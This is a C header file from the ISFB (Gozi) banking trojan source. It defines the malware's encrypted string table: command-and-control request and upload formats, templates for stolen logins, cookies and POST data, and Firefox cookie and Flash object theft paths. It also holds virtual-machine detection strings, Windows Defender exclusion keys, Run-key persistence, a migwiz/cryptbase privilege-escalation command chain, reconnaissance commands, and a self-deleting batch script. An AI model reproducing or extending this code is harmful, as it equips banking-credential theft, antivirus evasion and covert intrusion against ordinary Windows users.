//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: cschar.h
// $Revision: 459 $
// $Date: 2015-01-26 22:53:34 +0300 (Пн, 26 янв 2015) $
// description:
//	Defines constant char sequences allocated within a separate PE-section

#pragma once

#ifndef _DEBUG
	#define	_CS_ENCRYPT_STRINGS
#endif

// Original section name that will be created within a file
#define	CS_SECTION_NAME	".bss0"
// The section will be renamed after the encryption completes.
//	This is because we cannot use reserved section names aka ".rdata" or ".bss" during compile time.
#define	CS_NEW_SECTION_NAME	".bss"

#pragma section(CS_SECTION_NAME, read, write)

#define	CSCHAR	__declspec(allocate(CS_SECTION_NAME), align(1)) CHAR
#define	CSTCHAR	__declspec(allocate(CS_SECTION_NAME), align(1)) TCHAR
#define	CSWCHAR	__declspec(allocate(CS_SECTION_NAME), align(1)) WCHAR

#define	CSCHAR_DECL(x)	extern CSCHAR x[sizeof(x##_src)]
#define	CSCHAR_DEF(x)	CSCHAR x[sizeof(x##_src)] = x##_src
#define	CSTCHAR_DECL(x)	extern CSTCHAR x[(sizeof(x##_src) / sizeof(_TCHAR))]
#define	CSTCHAR_DEF(x)	CSTCHAR x[(sizeof(x##_src) / sizeof(_TCHAR))] = x##_src
#define	CSWCHAR_DECL(x)	extern CSWCHAR x[(sizeof(x##_src) / sizeof(WCHAR))]
#define	CSWCHAR_DEF(x)	CSWCHAR x[(sizeof(x##_src) / sizeof(WCHAR))] = x##_src

#define	CS_COOKIE	0x25e36637

#ifdef __cplusplus
 extern "C" {
#endif

extern ULONG	g_CsCookie;

ULONG __stdcall CsGetKey(VOID);

WINERROR	CsDecryptSection(
	HMODULE	hModule,
	ULONG	Seed
	);

#ifdef __cplusplus
 }
#endif


#define szRequestFmt_src		_T("soft=1&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x")
#define	szPostFmt_src			_T("version=%u&soft=1&user=%08x%08x%08x%08x&server=%u&id=%u&type=%u&name=%s")
#define szRequestFmtStr_src		_T("version=%u&soft=1&user=%s&server=%u&id=%u&crc=%x")
#define	szPostFmtStr_src		_T("soft=1&version=%u&user=%s&server=%u&id=%u&type=%u&name=%s")

#define	szBrowserVersion_src	_T("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT %u.%u%s)")
#define	szBrowserArch64_src		_T("; Win64; x64")

#define szHttp_src				_T("http://")
#define	szHttps_src				_T("https://")
#define	szVolume_src			_T("\\\\.\\%s")
#define	szVfsUserId_src			_T("USER.ID")


#define szLdrFmt_src			_T("%lu.exe")
#define LdrFmtLen				1+10+4+1
#define	szLdrUpdFmt_src			_T("/upd %lu")

// The following string is used to calculate g_CsCookie variable and to validate strings section decryption.
// To modify it you also have to change CS_COOKIE constant value, wich is nothing but CRC32 of the string.
#define szDataRegSubkey_src		_T("SOFTWARE\\AppDataLow\\")

#define szDataRegDataValue_src	_T("Main")
#define	szDataRegBlockValue_src	_T("Block")
#define	szDataRegTemplate_src	_T("Temp")
#define szDataRegClientId_src	_T("Client")
#define szDataRegIniValue_src	_T("Ini")
#define szDataRegKeysValue_src	_T("Keys")
#define szDataRegExeValue_src	_T("Install")
#define	szVars_src				_T("\\Vars")
#define	szFiles_src				_T("\\Files")
#define	szRun_src				_T("\\Run")

#define szFindAll_src			_T("\\*.*")
#define szFindExe_src			_T("\\*.exe")
#define szFindDll_src			_T("\\*.dll")
#define szDot_src				_T(".")
#define szBkSlash_src			_T("\\")

#define	szTemplateUrl_src		_T("http://constitution.org/usdeclar.txt")	// words template file URL
#define	uTemplateCrc			0x4eb7d2ca									// words template CRC

#define szOpenIe_src			_T("C:\\Program Files\\Internet Explorer\\iexplore.exe")
#define szAutoPath_src			_T("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
#define szAppCertDlls_src		_T("System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls")

#define	szText_src				_T("text")
#define	szImage_src				_T("image")
#define	szJson_src				_T("json")
#define	szHtml_src				_T("html")
#define	szJavascript_src		_T("javascript")

#define	szBasicFmt_src			_T("URL: %s\r\nuser=%s\r\npass=%s")
#define	szURLFmt_src			_T("URL: %s\r\nREF: %s\r\nLANG: %s\r\nAGENT: %s\r\nCOOKIE: %s\r\nPOST: ")
#define	szUserIdFmt_src			_T("USERID: %s\r\n")
#define	szUserFmt_src			_T("USER: %s\r\n")
#define	szDeviceFmt_src			_T("DEVICE: %s\r\nCLASS: %s\r\nINTERFACE: %s\r\n")

#define	szStoreVarFmt_src		_T("@%s@")
#define	szGrabData_src			_T("grabs=")
#define	szHidden_src			_T("HIDDEN")

#define	szDwFmt_src				_T("%08x%08x%08x%08x")
#define	szReplaceUserId_src		_T("@ID@")
#define	szReplaceVersion_src	_T("@GROUP@")

#define	szHttpEx_src			_T("http")
#define	szExtExe_src			_T(".exe")
#define	szExtDll_src			_T(".dll")
#define	szExtBat_src			_T(".bat")
#define	szLocal_src				_T("Local\\")
#define	szEmptyString_src		_T("")
#define	szPipe_src				_T("\\\\.\\pipe\\")
#define	szMicrosoft_src			_T("\\Microsoft\\")
#define	szAppDataMicrosoft_src	_T("%APPDATA%\\Microsoft\\")
#define	szAppData_src			_T("%APPDATA%")
#define	szForm_src				_T("form")
#define	szLog_src				_T("log")
#define	szKeyLog_src			_T("keys")

#define	szPost_src				_T("POST")
#define	szGet_src				_T("GET")
#define	szSocksId_src			_T("-01")

#define	sz64_src				_T("64")


#define szBoundary_src			_T("--------------------------%04x%04x%04x")
#define	uBoundryLen				(sizeof(szBoundary) + 3 * sizeof(ULONG))

#define szContentTypeMulti_src	_T("Content-Type: multipart/form-data; boundary=%s")
#define szContDisp_src			_T("Content-Disposition: form-data; name=\"upload_file\"; filename=\"%.4u.%lu\"")
#define	szContDispFile_src		_T("Content-Disposition: form-data; name=\"upload_file\"; filename=\"%s\"")
#define szContentTypeApp_src	_T("Content-Type: application/octet-stream")
#define szOptional_src			_T("--%s\r\n%s\r\n%s\r\n\r\n")
#define szContEnd_src			_T("\r\n--%s--\r\n")


#define szGuidStrTemp1_src		_T("{%08X-%04X-%04X-%04X-%08X%04X}")
#define szGuidStrTemp2_src		_T("%08X-%04X-%04X-%04X-%08X%04X")
#define szDefaultDaclStr_src	_T("D:(D;OICI;GA;;;BG)(D;OICI;GA;;;AN)(A;OICI;GA;;;AU)(A;OICI;GA;;;BA)")
#define	szLowIntegrityDaclStr_src	_T("S:(ML;;NW;;;LW)")

#define szOpen_src				_T("open")
#define szRunas_src				_T("runas")
#define szBatFmt_src			_T("%lu.bat")
#define szBatchFile_src			_T("attrib -r -s -h %%1\r\n:%u\r\ndel %%1\r\nif exist %%1 goto %u\r\ndel %%0\r\n")

#define	szDataUrl_src			_T("/data.php?version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&type=%u&name=%s")

#define szUpd_src				_T("/UPD")
#define szSd_src				_T("/SD")
#define	szLdrSdFmt_src			_T("/sd %lu")

#define szRunFmt_src			_T("rundll32 \"%s\",%s")
#define szRunFmt2_src			_T("\"%s\",%s")
#define	szRundll32_src			_T("rundll32")
#define szClientDll_src			_T("client.dll")
#define szClientDll64_src		_T("client64.dll")

#define	szExplorerEvent_src		_T("Local\\ShellReadyEvent")
#define	szExplorerExe_src		_T("explorer.exe")
#define	szNtCurrentVersion_src	_T("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")
#define	szSystemRoot_src		_T("SystemRoot")

#define	szCopyTmpl_src			_T("**")

#define	szVbox_src				_T("vbox")
#define	szQemu_src				_T("qemu")
#define	szVmware_src			_T("vmware")
#define	szVirtualHd_src			_T("virtual hd")
#define	szAvFileName_src		_T("c:\\321.txt")

#define	szDefenderKey_src		_T("MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths")
#define	szMsSeKey_src			_T("MACHINE\\SOFTWARE\\Microsoft\\Microsoft Antimalware\\Exclusions\\Paths")

#define	szWininet_src			"WININET.DLL"		// used to search within PE, should be in the uppercase
#define	szNspr4_src				"NSPR4.DLL"			//
#define	szNss3_src				"NSS3.DLL"			//
#define	szChrome_src			"CHROME.DLL"		//
#define	szWS2_32_src			"WS2_32.DLL"		//
#define	szOpera_src				"OPERA.EXE"
#define	szWsock32_src			"WSOCK32.DLL"
#define	szWininetDll_src		"WININET.dll"		// case sensitive !
#define	szKernel32_src			"KERNEL32.DLL"
#define	szAdvapi32_src			"ADVAPI32.DLL"
#define	szNtdll_src				"NTDLL.DLL"
#define	szKernelbase_src		"kernelbase"
	

#define	szHost_src				"Host:"
#define	szUserAgent_src			"User-Agent:"
#define	szConnection_src		"Connection:"
#define	szContentMd5_src		"Content-MD5:"
#define	szContentType_src		"Content-Type:"
#define	szContentLength_src		"Content-Length:"
#define	szTransferEncoding_src	"Transfer-Encoding:"
#define	szAcceptEncoding_src	"Accept-Encoding:"
#define	szReferer_src			"Referer: "
#define	szAcceptLanguage_src	"Accept-Language: "
#define	szCookie_src			"Cookie: "
#define	szSecPolicy_src			"Content-Security-Policy:"
#define	szSecPolicyReport_src	"Content-Security-Policy-Report-Only:"
#define	szXFrameOptions_src		"X-Frame-Options"
#define	szAccessCtrlOrigin_src	"Access-Control-Allow-Origin:"

#define	szChunkSize_src			"%x\r\n"
#define	szContentLengthTmp_src	"Content-Length: %u\r\n\r\n"
#define	szOCSP_src				"ocsp"
#define	szChunked_src			"chunked"
#define	szIdentity_src			" identity"
#define	szEmptyStr_src			"\r\n\r\n"
#define	sz404_src				"404 Not Found"
#define	sz200_src				"200 OK"

#define	szTimeMask_src			_T("%02u:%02u:%02u ")
#define	TimeMaskLen				2+1+2+1+2+1				// bytes
#define	szLogFailed_src			"EMPTY\n"
#define	szLogCmdProcessed_src	"Cmd %s processed: %u"
#define	szLogCmdComplete_src	" | \"%s\" | %u\r\n"
#define	szLogCmdParsing_src		"Cmd %u parsing: %u"

#define	szDiskDirectory_src		".set MaxDiskSize=0\r\n.set DiskDirectory1=\"%s\"\r\n"
#define	szCabinetName_src		".set CabinetName1=\"%s\"\r\n"
#define	szDestinationDir_src	".set DestinationDir=\"%S\"\r\n"
#define	szQuotes_src			"\"%s\"\r\n"
#define	szSetup1_src			"\\setup.inf"
#define	szSetup2_src			"\\setup.rpt"

#define	szMakeCabParam_src		"makecab.exe /F \"%s\""
#define	szCmdParam_src			"cmd /C \"%s> %s1\""
#define	szSysinfoParam_src		"systeminfo.exe "
#define	szTasklistParam_src		"tasklist.exe /SVC >"
#define	szDriverParam_src		"driverquery.exe >"
#define	szRegParam_src			"reg.exe query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" /s >"
#define	szTypeParam_src			"cmd /U /C \"type %s1 > %s & del %s1\"" 
#define	szInfoDelimiter_src		"echo -------- >"

#define	szUnknown_src			"Unknown"
#define	szDotPfx_src			".pfx"
#define	szMy_src				"My"
#define	szAddressBook_src		"AddressBook"
#define	szAuthRoot_src			"AuthRoot"
#define	szCertificateAuthority_src	"CertificateAuthority"
#define	szDisallowed_src		"Disallowed"
#define	szRoot_src				"Root"
#define	szTrustedPeople_src		"TrustedPeople"
#define	szTrustedPublisher_src	"TrustedPublisher"

#define	szInternetSetStatusCallback_src "InternetSetStatusCallback"
#define	szHttpAddRequestHeadersW_src	"HttpAddRequestHeadersW"
#define szHttpAddRequestHeadersA_src	"HttpAddRequestHeadersA"
#define szHttpQueryInfoW_src			"HttpQueryInfoW"
#define szHttpQueryInfoA_src			"HttpQueryInfoA"
#define szInternetConnectW_src			"InternetConnectW"
#define szInternetConnectA_src			"InternetConnectA"
#define szInternetQueryDataAvailable_src "InternetQueryDataAvailable"
#define szHttpSendRequestW_src			"HttpSendRequestW"
#define szHttpSendRequestA_src			"HttpSendRequestA"
#define szInternetReadFileExW_src		"InternetReadFileExW"
#define szInternetReadFileExA_src		"InternetReadFileExA"
#define szInternetWriteFile_src			"InternetWriteFile"
#define szInternetReadFile_src			"InternetReadFile"
#define szHttpOpenRequestW_src			"HttpOpenRequestW"

#define	szrecv_src						"recv"
#define	szclosesocket_src				"closesocket"
#define	szWSASend_src					"WSASend"
#define	szWSARecv_src					"WSARecv"
#define	szLoadLibraryExW_src			"LoadLibraryExW"
#define	szRegQueryValueExW_src			"RegQueryValueExW"
#define	szRegGetValueW_src				"RegGetValueW"

#define	szPR_Read_src			"PR_Read"
#define	szPR_Write_src			"PR_Write"
#define	szPR_Close_src			"PR_Close"
#define	szPR_Poll_src			"PR_Poll"
#define	szPR_GetError_src		"PR_GetError"
#define	szPR_SetError_src		"PR_SetError"

#define szExitProcess_src		"ExitProcess"
#define	szIsWow64Process_src	"IsWow64Process"
#define	szWow64EnableWow64FsRedirection_src	"Wow64EnableWow64FsRedirection"
#define	szCreateProcessA_src	"CreateProcessA"


#define	szLdrRegisterDllNotification_src	"LdrRegisterDllNotification"
#define	szLdrUnregisterDllNotification_src	"LdrUnregisterDllNotification"
#define	szZwWow64QueryInformationProcess64_src	"ZwWow64QueryInformationProcess64"
#define	szZwWow64ReadVirtualMemory64_src	"ZwWow64ReadVirtualMemory64"
#define	szZwGetContextThread_src			"ZwGetContextThread"
#define	szZwSetContextThread_src			"ZwSetContextThread"
#define	szZwProtectVirtualMemory_src		"ZwProtectVirtualMemory"
#define	szZwWriteVirtualMemory_src			"ZwWriteVirtualMemory"
#define	szLdrLoadDll_src					"LdrLoadDll"
#define	szLdrGetProcedureAddress_src		"LdrGetProcedureAddress"
#define	szCryptGetUserKey_src				"CryptGetUserKey"
#define	szLoadLibraryA_src					"LoadLibraryA"
#define	szExitThread_src					"RtlExitUserThread"
#define	szRtlSetUnhandledExceptionFilter_src "RtlSetUnhandledExceptionFilter"

#define	szDateTimeFmt_src					"%02u-%02u-%02u %02u:%02u:%02u\r\n"
#define	szPluginRegisterCallbacks_src		"PluginRegisterCallbacks"
#define	szCreateProcessNotify_src			"CreateProcessNotify"
#define	szDllEntryPoint_src					"DllRegisterServer"
#define	szMaskAll_src						"*.*"



#define wczFfProfiles_src		L"\\Mozilla\\Firefox\\Profiles\\"
#define wczSolFiles_src			L"\\Macromedia\\Flash Player\\"
#define	wczFFCookie1_src		L"cookies.sqlite"
#define	wczFFCookie2_src		L"cookies.sqlite-journal"
#define	wczSol_src				L"*.sol"
#define	wczTxt_src				L"*.txt"
#define	wczFfCookies_src		L"\\cookie.ff"
#define	wczIeCookies_src		L"\\cookie.ie"
#define	wczSols_src				L"\\sols"
#define	wczDosDevicePrefix_src	L"\\\\?\\"
#define	wczMaskAll_src			L"*.*"
#define	wczISFB_src				L"ISFB"
#define	wczSpdyOff_src			L" --use-spdy=off"
#define	wczImageGif_src			L"image/gif"
#define	wczImageBmp_src			L"image/bmp"

#define szGifSign_src			"GIF"
#define szGif87a_src			"87a"
#define szGif89a_src			"89a"

#define	sz1252nls_src			"\\c_1252.nls"

#define	wczReportFormat_src		L"%02u-%02u-%02u %02u:%02u:%02u\r\n%s\r\n%s\r\n\r\n%s\r\n\r\n"
#define	wczFormatClipbrd_src	L"%02u-%02u-%02u %02u:%02u:%02u\r\nClipboard\r\n\r\n%S\r\n\r\n"
#define	wczWinExplorer_src		L"Windows Explorer"

#define	wczDelegateExecute_src	L"DelegateExecute"
#define	wczClassesChrome_src	L"SOFTWARE\\Classes\\Chrome"
#define	wczCommand_src			L"command"
#define wczFindAll_src			L"*.*"

#define	szInternetSettings_src	"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"
#define	szEnableSpdy_src		"EnableSPDY3_0"

#define	szRdataSec_src			".rdata\0\0"
#define	szTextSec_src			".text\0\0\0"
#define	szDataSec_src			".data\0\0\0"

#define	szZoneIdentifier_src	":Zone.Identifier"

#define	szLocalLow_src			"AppData\\LocalLow"
#define	szSystem32_src			"%WINDIR%\\system32"
#define szMigwizPath_src		"%WINDIR%\\system32\\migwiz"
#define	szMigwizExe_src			"migwiz.exe"
#define	szCryptbaseDll_src		"cryptbase.dll"
#define	szCmd1_src				"makecab.exe /V1 \"%s\" \"%s\""
#define	szCmd2_src				"cmd.exe /C wusa.exe \"%s\" /quiet /extract:%s"
#define	szCmd3_src				"cmd.exe /C \"%s\\%s\""
#define	szMsu_src				".msu"
#define	szTemp_src				"TEMP"
#define	szTmp_src				"TMP"

#define	szCreateProcessW_src	"CreateProcessW"
#define	szTerminateProcess_src	"TerminateProcess"

#define	szAvifil32_src				"avifil32.dll"
#define	szvfw32_src					"vfw32.dll"

#define	szAVIFileInit_src			"AVIFileInit"
#define szAVIFileOpen_src			"AVIFileOpenW"
#define szAVIFileCreateStream_src	"AVIFileCreateStreamW"
#define szAVIMakeCompressedStream_src	"AVIMakeCompressedStream"
#define szAVIStreamSetFormat_src	"AVIStreamSetFormat"
#define szAVIFileRelease_src		"AVIFileRelease"
#define szAVIStreamEndStreaming_src	"AVIStreamEndStreaming"
#define szAVISaveOptions_src		"AVISaveOptions"
#define szAVIStreamRelease_src		"AVIStreamRelease"
#define szAVIFileExit_src			"AVIFileExit"
#define szAVIStreamStart_src		"AVIStreamStart"
#define szAVIStreamWrite_src		"AVIStreamWrite"

#define	szCmdExe_src				"cmd.exe"
#define	szCmdCopyRun_src			"/C \"copy \"%s\" \"%s\" /y && \"%s\"\""


#ifdef __cplusplus
 extern "C" {
#endif

CSWCHAR_DECL(wczFfProfiles);
CSWCHAR_DECL(wczSolFiles);
CSWCHAR_DECL(wczFFCookie1);
CSWCHAR_DECL(wczFFCookie2);
CSWCHAR_DECL(wczSol);
CSWCHAR_DECL(wczTxt);
CSWCHAR_DECL(wczFfCookies);
CSWCHAR_DECL(wczIeCookies);
CSWCHAR_DECL(wczSols);
CSWCHAR_DECL(wczDosDevicePrefix);
CSWCHAR_DECL(wczMaskAll);
CSWCHAR_DECL(wczISFB);
CSWCHAR_DECL(wczSpdyOff);
CSWCHAR_DECL(wczImageGif);
CSWCHAR_DECL(wczImageBmp);
CSWCHAR_DECL(wczReportFormat);
CSWCHAR_DECL(wczFormatClipbrd);
CSWCHAR_DECL(wczWinExplorer);
CSWCHAR_DECL(wczDelegateExecute);
CSWCHAR_DECL(wczClassesChrome);
CSWCHAR_DECL(wczCommand);
CSWCHAR_DECL(wczFindAll);

CSTCHAR_DECL(szInternetSettings);
CSTCHAR_DECL(szEnableSpdy);

CSTCHAR_DECL(szRequestFmt);
CSTCHAR_DECL(szPostFmt);
CSTCHAR_DECL(szRequestFmtStr);
CSTCHAR_DECL(szPostFmtStr);

CSTCHAR_DECL(szBrowserVersion);
CSTCHAR_DECL(szBrowserArch64);

CSTCHAR_DECL(szHttp);
CSTCHAR_DECL(szHttps);
CSTCHAR_DECL(szVolume);
CSTCHAR_DECL(szVfsUserId);
CSTCHAR_DECL(szLdrFmt);
CSTCHAR_DECL(szLdrUpdFmt);
CSTCHAR_DECL(szDataRegSubkey);
CSTCHAR_DECL(szDataRegDataValue);
CSTCHAR_DECL(szDataRegBlockValue);
CSTCHAR_DECL(szDataRegTemplate);
CSTCHAR_DECL(szDataRegClientId);
CSTCHAR_DECL(szDataRegIniValue);
CSTCHAR_DECL(szDataRegKeysValue);
CSTCHAR_DECL(szDataRegExeValue);
CSTCHAR_DECL(szFindAll);
CSTCHAR_DECL(szFindExe);
CSTCHAR_DECL(szFindDll);
CSTCHAR_DECL(szDot);
CSTCHAR_DECL(szBkSlash);
CSTCHAR_DECL(szTemplateUrl);
CSTCHAR_DECL(szOpenIe);
CSTCHAR_DECL(szAutoPath);
CSTCHAR_DECL(szAppCertDlls);
CSTCHAR_DECL(szText);
CSTCHAR_DECL(szImage);
CSTCHAR_DECL(szJson);
CSTCHAR_DECL(szHtml);
CSTCHAR_DECL(szJavascript);
CSTCHAR_DECL(szBasicFmt);
CSTCHAR_DECL(szURLFmt);
CSTCHAR_DECL(szUserIdFmt);
CSTCHAR_DECL(szUserFmt);
CSTCHAR_DECL(szDeviceFmt);
CSTCHAR_DECL(szStoreVarFmt);
CSTCHAR_DECL(szGrabData);
CSTCHAR_DECL(szHidden);
CSTCHAR_DECL(szDwFmt);
CSTCHAR_DECL(szReplaceUserId);
CSTCHAR_DECL(szReplaceVersion);
CSTCHAR_DECL(szHttpEx);
CSTCHAR_DECL(szExtExe);
CSTCHAR_DECL(szExtDll);
CSTCHAR_DECL(szExtBat);
CSTCHAR_DECL(sz64);
CSTCHAR_DECL(szLocal);
CSTCHAR_DECL(szEmptyString);
CSTCHAR_DECL(szPipe);
CSTCHAR_DECL(szMicrosoft);
CSTCHAR_DECL(szAppDataMicrosoft);
CSTCHAR_DECL(szAppData);
CSTCHAR_DECL(szForm);
CSTCHAR_DECL(szLog);
CSTCHAR_DECL(szKeyLog);
CSTCHAR_DECL(szPost);
CSTCHAR_DECL(szGet);
CSTCHAR_DECL(szSocksId);
CSTCHAR_DECL(szBoundary);
CSTCHAR_DECL(szContentTypeMulti);
CSTCHAR_DECL(szContDisp);
CSTCHAR_DECL(szContDispFile);
CSTCHAR_DECL(szContentTypeApp);
CSTCHAR_DECL(szOptional);
CSTCHAR_DECL(szContEnd);
CSTCHAR_DECL(szGuidStrTemp1);
CSTCHAR_DECL(szGuidStrTemp2);
CSTCHAR_DECL(szDefaultDaclStr);
CSTCHAR_DECL(szLowIntegrityDaclStr);
CSTCHAR_DECL(szOpen);
CSTCHAR_DECL(szRunas);
CSTCHAR_DECL(szBatFmt);
CSTCHAR_DECL(szBatchFile);
CSTCHAR_DECL(szVars);
CSTCHAR_DECL(szFiles);
CSTCHAR_DECL(szRun);
CSTCHAR_DECL(szDataUrl);
CSTCHAR_DECL(szUpd);
CSTCHAR_DECL(szSd);
CSTCHAR_DECL(szLdrSdFmt);
CSTCHAR_DECL(szRunFmt);
CSTCHAR_DECL(szRunFmt2);
CSTCHAR_DECL(szRundll32);
CSTCHAR_DECL(szClientDll);
CSTCHAR_DECL(szClientDll64);
CSTCHAR_DECL(szExplorerEvent);
CSTCHAR_DECL(szExplorerExe);
CSTCHAR_DECL(szNtCurrentVersion);
CSTCHAR_DECL(szSystemRoot);

CSTCHAR_DECL(szCopyTmpl);

CSTCHAR_DECL(szVbox);
CSTCHAR_DECL(szQemu);
CSTCHAR_DECL(szVmware);
CSTCHAR_DECL(szVirtualHd);
CSTCHAR_DECL(szAvFileName);

CSTCHAR_DECL(szDefenderKey);
CSTCHAR_DECL(szMsSeKey);

CSCHAR_DECL(szWininet);
CSCHAR_DECL(szNspr4);
CSCHAR_DECL(szNss3);
CSCHAR_DECL(szChrome);
CSCHAR_DECL(szWS2_32);
CSCHAR_DECL(szOpera);
CSCHAR_DECL(szWsock32);
CSCHAR_DECL(szWininetDll);
CSCHAR_DECL(szKernel32);
CSCHAR_DECL(szAdvapi32);
CSCHAR_DECL(szNtdll);
CSCHAR_DECL(szKernelbase);
CSCHAR_DECL(szHost);
CSCHAR_DECL(szUserAgent);
CSCHAR_DECL(szConnection);
CSCHAR_DECL(szContentMd5);
CSCHAR_DECL(szContentType);
CSCHAR_DECL(szContentLength);
CSCHAR_DECL(szTransferEncoding);
CSCHAR_DECL(szAcceptEncoding);
CSCHAR_DECL(szReferer);
CSCHAR_DECL(szAcceptLanguage);
CSCHAR_DECL(szCookie);
CSCHAR_DECL(szSecPolicy);
CSCHAR_DECL(szSecPolicyReport);
CSCHAR_DECL(szXFrameOptions);
CSCHAR_DECL(szAccessCtrlOrigin);
CSCHAR_DECL(szChunkSize);
CSCHAR_DECL(szContentLengthTmp);
CSCHAR_DECL(szOCSP);
CSCHAR_DECL(szChunked);
CSCHAR_DECL(szIdentity);
CSCHAR_DECL(szEmptyStr);
CSCHAR_DECL(sz404);
CSCHAR_DECL(sz200);
CSCHAR_DECL(szTimeMask);
CSCHAR_DECL(szLogFailed);
CSCHAR_DECL(szLogCmdProcessed);
CSCHAR_DECL(szLogCmdComplete);
CSCHAR_DECL(szLogCmdParsing);
CSCHAR_DECL(szPR_Read);
CSCHAR_DECL(szPR_Write);
CSCHAR_DECL(szPR_Close);
CSCHAR_DECL(szDiskDirectory);
CSCHAR_DECL(szCabinetName);
CSCHAR_DECL(szDestinationDir);
CSCHAR_DECL(szQuotes);
CSCHAR_DECL(szSetup1);
CSCHAR_DECL(szSetup2);
CSCHAR_DECL(szMakeCabParam);
CSCHAR_DECL(szCmdParam);
CSCHAR_DECL(szSysinfoParam);
CSCHAR_DECL(szTasklistParam);
CSCHAR_DECL(szDriverParam);
CSCHAR_DECL(szRegParam);
CSCHAR_DECL(szTypeParam);
CSCHAR_DECL(szInfoDelimiter);
CSCHAR_DECL(szUnknown);
CSCHAR_DECL(szDotPfx);
CSCHAR_DECL(szMy);
CSCHAR_DECL(szAddressBook);
CSCHAR_DECL(szAuthRoot);
CSCHAR_DECL(szCertificateAuthority);
CSCHAR_DECL(szDisallowed);
CSCHAR_DECL(szRoot);
CSCHAR_DECL(szTrustedPeople);
CSCHAR_DECL(szTrustedPublisher);
CSCHAR_DECL(szInternetSetStatusCallback);
CSCHAR_DECL(szHttpAddRequestHeadersW);
CSCHAR_DECL(szHttpAddRequestHeadersA);
CSCHAR_DECL(szHttpQueryInfoW);
CSCHAR_DECL(szHttpQueryInfoA);
CSCHAR_DECL(szInternetConnectW);
CSCHAR_DECL(szInternetConnectA);
CSCHAR_DECL(szInternetQueryDataAvailable);
CSCHAR_DECL(szHttpSendRequestW);
CSCHAR_DECL(szHttpSendRequestA);
CSCHAR_DECL(szInternetReadFileExW);
CSCHAR_DECL(szInternetReadFileExA);
CSCHAR_DECL(szInternetWriteFile);
CSCHAR_DECL(szInternetReadFile);
CSCHAR_DECL(szHttpOpenRequestW);

CSCHAR_DECL(szrecv);
CSCHAR_DECL(szclosesocket);
CSCHAR_DECL(szWSASend);
CSCHAR_DECL(szWSARecv);
CSCHAR_DECL(szLoadLibraryExW);
CSCHAR_DECL(szRegQueryValueExW);
CSCHAR_DECL(szRegGetValueW);
CSCHAR_DECL(szPR_Poll);
CSCHAR_DECL(szPR_GetError);
CSCHAR_DECL(szPR_SetError);
CSCHAR_DECL(szExitProcess);
CSCHAR_DECL(szIsWow64Process);
CSCHAR_DECL(szWow64EnableWow64FsRedirection);
CSCHAR_DECL(szCreateProcessA);
CSCHAR_DECL(szLdrRegisterDllNotification);
CSCHAR_DECL(szLdrUnregisterDllNotification);
CSCHAR_DECL(szZwWow64QueryInformationProcess64);
CSCHAR_DECL(szZwWow64ReadVirtualMemory64);
CSCHAR_DECL(szZwGetContextThread);
CSCHAR_DECL(szZwSetContextThread);
CSCHAR_DECL(szZwProtectVirtualMemory);
CSCHAR_DECL(szZwWriteVirtualMemory);
CSCHAR_DECL(szLdrLoadDll);
CSCHAR_DECL(szLdrGetProcedureAddress);
CSCHAR_DECL(szRtlSetUnhandledExceptionFilter);

CSCHAR_DECL(szCryptGetUserKey);
CSCHAR_DECL(szLoadLibraryA);
CSCHAR_DECL(szExitThread);
CSCHAR_DECL(szDateTimeFmt);
CSCHAR_DECL(szPluginRegisterCallbacks);
CSCHAR_DECL(szCreateProcessNotify);
CSCHAR_DECL(szDllEntryPoint);
CSCHAR_DECL(sz1252nls);
CSCHAR_DECL(szMaskAll);

CSCHAR_DECL(szGifSign);
CSCHAR_DECL(szGif87a);
CSCHAR_DECL(szGif89a);

CSCHAR_DECL(szRdataSec);
CSCHAR_DECL(szTextSec);
CSCHAR_DECL(szDataSec);

CSCHAR_DECL(szZoneIdentifier);

CSCHAR_DECL(szLocalLow);
CSCHAR_DECL(szSystem32);
CSCHAR_DECL(szMigwizPath);
CSCHAR_DECL(szMigwizExe);
CSCHAR_DECL(szCryptbaseDll);
CSCHAR_DECL(szCmd1);
CSCHAR_DECL(szCmd2);
CSCHAR_DECL(szCmd3);
CSCHAR_DECL(szMsu);
CSCHAR_DECL(szTemp);
CSCHAR_DECL(szTmp);

CSCHAR_DECL(szCreateProcessW);
CSCHAR_DECL(szTerminateProcess);

CSCHAR_DECL(szAvifil32);
CSCHAR_DECL(szvfw32);
CSCHAR_DECL(szAVIFileInit);
CSCHAR_DECL(szAVIFileOpen);
CSCHAR_DECL(szAVIFileCreateStream);
CSCHAR_DECL(szAVIMakeCompressedStream);
CSCHAR_DECL(szAVIStreamSetFormat);
CSCHAR_DECL(szAVIFileRelease);
CSCHAR_DECL(szAVIStreamEndStreaming);
CSCHAR_DECL(szAVISaveOptions);
CSCHAR_DECL(szAVIStreamRelease);
CSCHAR_DECL(szAVIFileExit);
CSCHAR_DECL(szAVIStreamStart);
CSCHAR_DECL(szAVIStreamWrite);

CSCHAR_DECL(szCmdExe);
CSCHAR_DECL(szCmdCopyRun);

extern CSCHAR cNetscapeExt[19];

#ifdef __cplusplus
 }
#endif
